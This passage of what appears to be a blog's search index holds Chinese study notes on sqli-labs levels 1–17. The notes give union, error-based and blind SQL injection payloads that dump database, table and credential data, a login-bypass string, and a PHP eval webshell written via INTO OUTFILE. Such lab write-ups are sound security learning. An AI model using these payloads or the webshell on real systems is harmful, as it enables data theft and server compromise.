&#x3D; &#39;users&#39; limit 4,1),0x2b,floor(rand(0)*2))x from information_schema.columns group by x --+ 字段值payload：concat里在放个concat~ Code?id&#x3D;1&#39; union select 1,count(*),concat((select concat(username,&quot;:&quot;,password) from users limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.columns group by x --+ 第二种写法 上面的这个payload可以改为：以下所有payload最后的limit 0,1可以去掉，最后的括号不能去 select 1 from table：增加临时列，列值是写在select后的数，这条语句中，每行的列值为1。 用1的效率 &gt;用 * 的效率 select 1 from ()b =&gt; select 1 from b，在b上多加1列 Code?id&#x3D;1&#39; and (select 1 from (select count(*),concat(database(),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1) --+ 爆表名payload： Code?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1) --+ 爆列名payload： Code?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1) --+ 爆字段值payload： Code?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select concat(username,&#39;:&#39;,password) from users limit 0,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1) --+ sqli-lab6 跟lab5一样，只不过是双引号闭合。把payload的单引号换成双引号即可 写给自己 我真是服了我自己了，就三个法(两个法)写了三四天，我人傻了真的，写payload简单，但是语句函数看不懂，查资料也要看半天(我真头是🐷…)，还有从早上到晚的网课，所以就只好舍弃剩下的东西了,这谁顶的住啊🤷‍♂️🤷‍♂️ 照这样下去，毕业了sqli都写不完。。。。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-7","slug":"sqli-labs-7","date":"2020-10-01T11:42:20.093Z","updated":"2020-03-28T08:20:42.538Z","comments":true,"path":"2020/10/01/sqli-labs-7/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-7/","excerpt":"","text":"sqli-labs-7 一、mysql数据库读写文件的函数 使用前提条件 当前用户的权限要足够高 mysql配置文件secure_file_priv的值不为NULL 知道绝对路径(写入webshell连接时需要) into outfile函数 用法：不只是php文件 Code&#39;&lt;?php @eval($_POST[&#39;jx&#39;]) ?&gt;&#39; into outfile &#39;D:&#x2F;phpstudy&#x2F;WWW&#x2F;1.php&#39; 如果单引号被过滤了(魔术引号magic_quotes_gpc=on)可以用char函数、hex函数或GBK宽字节注入(自己挖坑自己记得填。。。) 二、解题过程 ?id=1发现没有回显 尝试单引号闭合，报错了，但是注释后面的不能正常显示 查看源代码发现是单引号+双括号闭合 闭合后找绝对路径(可以通过phpinfo找路径或者用盲注)，，，emmmm对于这题我没啥找路径的思路🤷‍♂️，报错注入也不行~~ 写入文件： Code?id&#x3D;-1&#39;)) union select 1,&quot;999&quot;,3 into outfile &#39;D:\\\\phpstudy\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\sqli-labs-master\\\\sqli-labs-master\\\\Less-7\\\\1.txt&#39; --+ 这里有个坑，如果执行了语句却没写入文件的话，检查一下my.ini 中是否有secure_file_priv，并且值是否等于NULL。改成secure_file_priv = ‘’。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-2~4","slug":"sqli-labs-2~4","date":"2020-10-01T11:42:20.078Z","updated":"2020-03-28T08:20:43.247Z","comments":true,"path":"2020/10/01/sqli-labs-2~4/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-2~4/","excerpt":"","text":"写在开头 因为这些比较像，主要是如何区分注入类型 sqli-labs-2 第二题跟第一题不一样，第二题是数字型的sql注入。 如何判断数字型和字符型的sql注入 数字型的判断： 单引号、双引号、括号等闭合符号报错（尽量都试一下） and 1=1 可以显示结果 and 1=2 不会显示结果但也不会报错 满足这两点基本上就是数字型的注入了。 字符型的判断： 跟数字型不用闭合不同，字符型一般是需要闭合的，可能用单引号、双引号、括号等。 因为原本的语句是: Codeselect * from where id&#x3D;&#39;用户输入的东西&#39; limit 0,1 如果输入的时候输入个单引号，那就有三个单引号了，就会报错（也有可能不是单引号识别的闭合符号），但是这种情况你输入括号、双引号，那么它会被当成字符执行，也就是不报错。 用双引号、括号正常显示： 在已经知道报错符号的情况下，搭配注释符，正常显示： 再搭配上and 1=1正常显示 and 1=2 不会显示不会报错。（类似数字型） 分清楚了字符型和数字型的判断之后的操作其实是一样的，只不过数字型不需要闭合符号以及注释！ sqli-labs-3 上来?id=1加个分号，发现报错的时候不只有单引号，还有个括号，所以接下来要加个括号闭合 加括号的同时也要记得把注释符安排上，因为可以依靠报错发现是个字符型的注入，所以注释符很有必要！ 接下来就是是按流程走了。order by、联合查询（联合查询一定要记得前面先报错啊，每次做都会忘记！） payload： 获取表名： Code?id&#x3D;-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database()或者用 &quot;数据库名&quot; --+ 获取列名： Code?id&#x3D;-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name &#x3D; &quot;表名&quot;--+ 获取列值： Code?id&#x3D;-1&#39;) union select 1,group_concat(username,0x2b（2b加号）,password),3 from users（表名） --+ sqli-labs-4 尝试单引号闭合没有报错；尝试双引号闭合，报错了。所以判断为双引号闭合报错、字符型。 假如没有报错提示，如何发现括号？ 注释后没有正常显示，要考虑括号的情况 后面的步骤就跟前面几题是一样的了 写在最后的随便写写 两天才磨磨蹭蹭写了四道题。。。也不知道自己一天天在干嘛😵 仔细想想每天早上八点🕗起床，简单的吃过早饭后，就一直坐在电脑前坐到中午吃饭，吃完午饭便又坐到了电脑前。中间坐在电脑前干嘛，想不起来。晚饭过后的事情就记得非常清楚，跟朋友开黑一直到凌晨1-2🕐点，看会手机然后睡觉。直到第二天八点左右🕗起床，如此反复，每天如此。要说规律也确实是十分规律。但是一天过去能记住的东西微乎甚微🙈🙈🙈 没有动力😕，没有方向😕，没有脑袋😕 想要改变但是太困难了。 努力吧，，，try hard！🏃","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-17","slug":"sqli-labs-17","date":"2020-10-01T11:42:20.078Z","updated":"2020-04-15T05:26:21.272Z","comments":true,"path":"2020/10/01/sqli-labs-17/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-17/","excerpt":"","text":"sqli-labs-17 check_input函数 如果输入的value非空，取前16位。限制了字数上限 get_magic_quotes_gpc()：魔术引号函数，如果在配置文件里get_magic_quotes_gpc = On，返回1，等于off，则返回0。 如果魔术引号开着，stripslashes函数（删除反斜杠）删除value里的反斜杠 ctype_digit：检测是不是纯数字字符串，如果不是，返回0，并且就在前后加单引号。 开始！ 进来一看是个重置密码的页面 用户名已知（关键！），而且有那么多限制，所以只能在new password上尝试注入。 输入正确用户名，密码随便输入一个，返回密码修改成功 如果用户名输入错误的话。。。 那么知道了注入点，用什么方法注入呢？ 报错注入 updatexml函数： 在构造payload的时候要注意闭合password语句，并且注释后面剩下的闭合符号！~ burp抓包得到的post参数 直接在burp里面改也可以 payload： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x2b,version(),0x2b),0)#&amp;submit&#x3D;Submit submit就是点击那个submit的操作，去掉不影响。 爆库名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x2b,database(),0x2b),0)#&amp;submit&#x3D;Submit 爆表名：只能显示一行 改limit 0，1 Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 0,1),0x2b),0)#&amp;submit&#x3D;Submit 爆列名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name &#x3D; &quot;users&quot; limit 0,1),0x2b),0)#&amp;submit&#x3D;Submit 爆值： 出大问题，爆不出来，下一个 查了一下，这个叫“不能先select 出同一表中的某些值，再update这个表” 怎么说呢？ 我们要查的表和他代码中update的表，是同一个表。 所以爆出了这个错 那怎么解决呢？ 百度搜了一下大佬的解决方法 “将select出来的结果通过中间表再select一遍”，于是有了下面的这个payload： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and (updatexml(1,concat(0x2b,(select username from(select username from users limit 0,1)a),0x2b),0))#&amp;submit&#x3D;Submit 也可以是as a 我的理解是把前面括号语句的结果给a，建了一个中间表，然后再去a里找username！ extractvalue函数： 跟上一个差不多 payload： 爆库名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39;and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#&amp;submit&#x3D;Submit 爆表名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39;and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1),0x7e)))#&amp;submit&#x3D;Submit 爆列名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39;and (extractvalue(1,concat(0x2b,(select column_name from information_schema.columns where table_name &#x3D; &quot;users&quot; limit 0,1),0x2b)))#&amp;submit&#x3D;Submit 爆值：不知道会不会跟上一种方法一样出问题，好激动 果然！ 改！ Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39;and (extractvalue(1,concat(0x2b,(select username from (select username from users limit 0,1)a),0x2b)))#&amp;submit&#x3D;Submit count、rand、floor、group by 具体原理都在labs5-6的那一篇里面 payload： 爆库名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and (select 1 from (select count(*),concat(database(),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1)#&amp;submit&#x3D;Submit 爆表名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 0,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1)#&amp;submit&#x3D;Submit 爆列名： Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&quot;users&quot; limit 0,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1)#&amp;submit&#x3D;Submit 爆值：不知道会不会出问题！ 没有问题！ Codeuname&#x3D;dhakkan&amp;passwd&#x3D;123&#39; and (select 1 from (select count(*),concat((select username from users limit 0,1),0x2b,floor(rand(0)*2))a from information_schema.tables group by a)b limit 0,1)#&amp;submit&#x3D;Submit","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-11~12","slug":"sqli-labs-11","date":"2020-10-01T11:42:20.062Z","updated":"2020-03-29T12:19:30.512Z","comments":true,"path":"2020/10/01/sqli-labs-11/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-11/","excerpt":"","text":"sqli-labs-11 万能密码 用户名：1’ or 1 = 1 # 密码：随便 万能密码百度一搜一大堆，但是你得知道他是拼接到sql语句中的，所以你只要 构造一个恒真的语句 闭合前面，注释后面 过程记录 进来是一个登陆界面 尝试万能密码。 成功进入，说明我们输入可以与数据库交互，存在注入点。 下面步骤也可以放在burp的repeater里做。 order by判断字段数，有报错回显 字段数为2 联合查询 两个都有回显。 爆数据库名和版本号 payload跟get时候的一样 记一句新学的，列出所有数据库名 Codeunion select 1,group_concat(schema_name) from information_schema.schemata 爆表名、列名、值 sqli-labs-12 同11题，不过闭合用的是 双引号+括号","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-13~14","slug":"sqli-labs-13","date":"2020-10-01T11:42:20.062Z","updated":"2020-04-15T05:09:26.537Z","comments":true,"path":"2020/10/01/sqli-labs-13/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-13/","excerpt":"","text":"sqli-labs-13 判断闭合符号 加单引号闭合，根据报错语句发现是 单引号+括号 闭合 单引号闭合报错、双引号不报错、单引号+括号报错、双引号+括号不报错 尝试万能密码登陆，发现没有回显，要用盲注或者报错注入 报错注入 翻之前lab5~6的报错注入记录 判断数据库名、版本号（大于5.0有 information_schema） payload： Code1&#39;) and updatexml(1,concat(0x2b,version(),0x2b),0) # 爆表名 分别是email、referers、uagents、users payload： Code1&#39;) and updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),0) # 爆列名 USER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username、password payload： Code1&#39;) and updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)),0) # 获取列值 第一个Dumb，对应密码Dumb payload： Code1&#39;) and updatexml(1,concat(0x2b,(select username from security.users limit 0,1)),0) # sqli-labs-14 可以通过报错注入，同上，双引号闭合。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"sqli-labs-15~16","slug":"sqli-labs-15~16","date":"2020-10-01T11:42:20.062Z","updated":"2020-04-15T05:11:26.676Z","comments":true,"path":"2020/10/01/sqli-labs-15~16/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-15~16/","excerpt":"","text":"sqli-labs-15 万能密码 万能密码尝试，成功进入。 但是没有回显，尝试报错注入。 没有回显，所以判断用盲注。 布尔盲注 判断数据库名payload： Code1&#39; or (select ascii(substr(database(),1,1))) &gt; 97 # 注意这里用的or而不是之前用的and，因为之前的and前面是id=1，是确定的，但是这里用户名我们是不知道的，所以需要用or。 真就显示登陆成功页面，错误就显示failed失败 改成小于号后，失败页面。 判断出来第一位是s (ascii：115)，数据库名security 判断表名 payload： Code1&#39; or (select ascii(substr((select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1),1,1))) &gt; 97 # 表名emails，referers，uagents，users 判断列名 payload： Code1&#39; or (select ascii(substr((select column_name from information_schema.columns where table_name &#x3D; &#39;users&#39; limit 0,1),1,1))) &gt; 0 # 判断列值： payload： Code1&#39; or (select ascii(substr((select username from security.users limit 0,1),1,1))) &gt; 0 # 因为我懒就不一步一步写出来了，改数字就好了。 sqli-labs-16 万能密码 尝试出来是用双引号括号闭合 一样需要用盲注，这边用时间盲注。 。。。。。。。。。。。。。。 尝试时间盲注错误的时候，浏览器就一直转转转，最后直接404 大概是因为，输入的东西都是错的而且还有个sleep函数的原因，把sleep函数的位置换成1，就正常显示登陆失败页面。。。。 还是用布尔比较靠谱。。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-10-01T11:42:20.015Z","updated":"2020-03-07T13:53:52.501Z","comments":true,"path":"2020/10/01/hello-world/","link":"","permalink":"https://c4stle.github.io/2020/10/01/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post bash$ hexo new \"My New Post\" More info: Writing Run server bash$ hexo server More info: Server Generate static files bash$ hexo generate More info: Generating Deploy to remote sites bash$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"sqli-labs-1","slug":"sqli-labs-1","date":"2020-03-13T03:28:45.000Z","updated":"2020-03-28T08:21:08.525Z","comments":true,"path":"2020/03/13/sqli-labs-1/","link":"","permalink":"https://c4stle.github.io/2020/03/13/sqli-labs-1/","excerpt":"","text":"写在开头： 一个小目标：把sqli-labs全部做一遍并且每题的解题过程、心得体会、新的发现都写下来 判断什么型的注入 题目提示是单引号闭合注入： 判断的方法： 加个单引号，页面没有正常显示，但是把后面的语句注释掉就可以正常显示。 这种情况就说明是单引号闭合注入 加入注释后正常显示了 注释符可以选的有： 如果使用#号的话需要改成url编码 %23 可以看到用#号的话 数据库是收不到的，因为在URL中 #号是用来指导浏览器动作的，对服务器端完全无用。（你看到这句话的时候你的URL中就有这个#锚点，不信你看往上看🙄） 编码后就可以正常访问 – ’ 一般都是用 – 即可，但是语句中有个单引号需要闭合：id = ’ 1’ – ’ limit 0,1 (红色为我们输入的)，可以看到有一个单引号需要闭合，所以们在最后用一个单引号 ‘ 即可 –+ 和 --%20（空格） **–+中的➕号会变成空格和后面隔开–**和单引号，空格同理，不过要用URL编码后的空格 order by判断字段数 3的时候正常显示 4的时候不可以，字段数为3 联合查询判断回显位置 要注意，联合查询的时候 前面语句要是错误的才可以成功 注入前需要知道的东西： database()函数：获取数据库名； version()函数：获取数据库版本； user()函数：查看当前用户 information_schema：mysql5.0及以上版本自带的数据库，记录当前mysql下所有数据库名，表名，列名。 information_schema.tables：记录所有表名信息的表 information_schema.columns：记录所有列名信息的表 table_name：表名 column_name：列名 table_schema：数据库名 group_concat()函数：如果只返回一个(limit 0,1)或者要查询的东西多于1个，就要用上这个函数，它可以将所有查到的结果连接起来一起返回 例如： Codegroup_concat(table_name) from information_schema where table_schema &#x3D; &quot;xxx&quot; 括号括起来的是要连接在一起的东西。 联合查询获取数据： 获取当前数据库：security 以及数据库版本：5.7.26 获取security库下所有表名： payload：当中的“security” 可以替换为 ‘security’ 以及 database() Code?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D;&quot;security&quot;--+ 获取users表下的所有列名： payload： Code?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name &#x3D;&quot;users&quot; 同时获取users下 username和password 的列值 payload：0x2b是ascii码中的2b 也就是➕，用来分隔开账号+密码，方便我们查看；也可以用不用ascii码，用单引号或者双引号括起来（username,’~’,password）也是可以的。 也可以不同时获取两个列名，分开获取也是可以的 Code?id&#x3D;-1&#39; union select 1,group_concat(username,0x2b,password),3 from users--+ 写在最后 明明以前有做过，但是时间久了就一点都想不起来😱😱😱 这也是我搭博客的一个原因吧，一个是觉得有一个自己的博客事件很酷的事情；一个是可以用来当备忘录， 毕竟自己写的总结的东西肯定是比光看别人的好多了🤗。 以前都用word做笔记，但是我觉得word记笔记太难看了！太难看了！太难看了！所以基本都是记完就不去看了。。。（地铁老爷爷看手机.jpg","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]}]}